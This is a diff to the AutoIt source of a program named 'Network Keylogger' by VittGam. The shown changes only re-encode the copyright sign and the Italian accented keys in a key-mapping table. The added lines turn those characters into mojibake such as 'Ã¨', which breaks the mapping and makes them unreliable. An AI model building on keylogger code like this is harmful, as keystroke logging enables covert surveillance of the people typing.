@@ -1,6 +1,6 @@
 #cs
 	Network Keylogger v1.0.0.2
-	Copyright © 2010 VittGam
+	Copyright Â© 2010 VittGam
 	http://www.Net-Keylogger.VittGam.net/
 	Net-Keylogger@VittGam.net
 
@@ -30,7 +30,7 @@
 #AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.2 by VittGam
 #AutoIt3Wrapper_Res_Description=Network Keylogger
 #AutoIt3Wrapper_Res_Fileversion=1.0.0.2
-#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
+#AutoIt3Wrapper_Res_LegalCopyright=Copyright Â© 2010 VittGam
 #AutoIt3Wrapper_Res_Field=InternalName|network_keylogger
 #AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger
 #AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
@@ -256,17 +256,17 @@ Global $keys_A4="{LALT1}"
 Global $keys_A4_up="{LALT0}"
 Global $keys_A5="{RALT1}"
 Global $keys_A5_up="{RALT0}"
-Global $keys_BA="è"
+Global $keys_BA="Ã¨"
 Global $keys_BB="+"
 Global $keys_BC=","
 Global $keys_BD="-"
 Global $keys_BE="."
-Global $keys_BF="ù"
-Global $keys_C0="ò"
+Global $keys_BF="Ã¹"
+Global $keys_C0="Ã²"
 Global $keys_DB="'"
 Global $keys_DC="\"
-Global $keys_DD="ì"
-Global $keys_DE="à"
+Global $keys_DD="Ã¬"
+Global $keys_DE="Ã "
 Global $doing=0
 Global $childpid=-1
 Global $lockbuffer=""
